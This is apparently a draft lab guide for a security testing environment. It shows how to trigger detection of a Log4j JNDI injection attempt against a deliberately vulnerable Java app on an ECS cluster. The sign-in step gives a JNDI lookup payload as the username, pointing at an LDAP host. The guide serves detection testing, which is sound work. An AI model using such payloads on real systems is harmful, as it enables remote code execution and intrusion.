# Scenario: Detect JNDI Injection in HTTP Request (Log4j)

***DRAFT***

## Prerequisites

- Vision One connected to your AWS Account
- Playground One ECS Cluster (Any variant)
  - Running app: Java-Goof running on vulnerable Tomcat

Ensure to have an ECS Cluster up and running:

```sh
pgo --apply ecs
```

## Disclaimer

> ***Note:*** It is highly recommended to have the `awsone.access_ip` set to a single IP or at least a small CIDR before deploying the ECS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.

## Exploiting

First, retrieve the load balancer DNS name

```sh
pgo -o ecs
```

Example output with ECS EC2:

```sh
cluster_name_ec2 = "playground-ecs-ec2"
loadbalancer_dns_ec2 = "playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com"
```

If you are using ECS Fargate, the variable is named `loadbalancer_dns_fargate`.

### Exploit

Navigate to <http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com/todolist>

Click `[Sign in]`

- Username: `${jndi:ldap://host.docker.internal:9999/Commons2}`
- Password: `does not matter`

Vision One Observed Attack Techniques:

![alt text](images/xdr_for_containers-ecs-log4j-01.png "Poc")

> ***Note:*** The currently deployed app is not vulnerable for Log4j, the technique from above still triggers the exploitation attempt.
